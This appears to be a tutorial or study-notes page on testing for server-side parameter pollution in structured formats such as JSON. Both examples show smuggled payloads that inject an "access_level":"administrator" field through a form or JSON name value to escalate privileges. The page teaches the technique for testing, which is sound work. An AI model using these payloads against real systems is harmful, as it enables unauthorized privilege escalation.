# 10. Testing for server-side parameter pollution in structured data formats

### 🧠 Overview

An attacker may be able to manipulate parameters to exploit vulnerabilities in how the **server processes structured data formats** like **JSON** or **XML**.

🧪 To test this, inject **unexpected structured data** into user inputs and observe how the server responds.

---

### 🔄 Example 1: Form Data Injection

---

### 🧾 User Behavior:

User edits their name in the profile.

Client-side request:

```
POST /myaccount
name=peter

```

Server-side request generated:

```
PATCH /users/7312/update
{"name":"peter"}

```

---

### 🚨 Exploit Attempt:

Inject additional field into the value:

```
POST /myaccount
name=peter","access_level":"administrator

```

If no proper validation/sanitization is applied, server-side request becomes:

```
PATCH /users/7312/update
{"name":"peter","access_level":"administrator"}

```

🟢 **Result:**

The user `peter` may now gain **administrator privileges**.

---

## 🧪 Example 2: JSON Input Injection

---

### 🧾 Client-side JSON request:

```
POST /myaccount
{"name": "peter"}

```

Resulting server-side request:

```
PATCH /users/7312/update
{"name":"peter"}

```

---

### 🚨 Exploit Attempt:

Send:

```
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}

```

If improperly decoded and injected, server builds:

```
PATCH /users/7312/update
{"name":"peter","access_level":"administrator"}

```

🟢 **Impact:**

The input pollutes the JSON object, adding **admin-level privileges** to the user.

---

## 📤 Structured Format Injection in Responses

Structured format injection can also occur in **responses**, particularly if:

- User input is securely stored in a **database**
- Then embedded into a **JSON response** from a back-end API
- Without **proper encoding**

🛠️ These vulnerabilities are typically **detectable and exploitable in the same way** as structured injection in requests.

---

## 📚 Related Pages

🔗 For how to identify injectable parameters:

**➡️ [Finding hidden parameters](https://chatgpt.com/c/686b5c29-d864-8006-90da-44dcbc63fa83#)**

📦 For similar attacks in XML:

**➡️ See the *XInclude attacks* section in the *XML External Entity (XXE) injection* topic**

---

### 📌 Note:

> While the above examples use JSON, server-side parameter pollution can occur in any structured data format, including XML, YAML, INI, etc.
>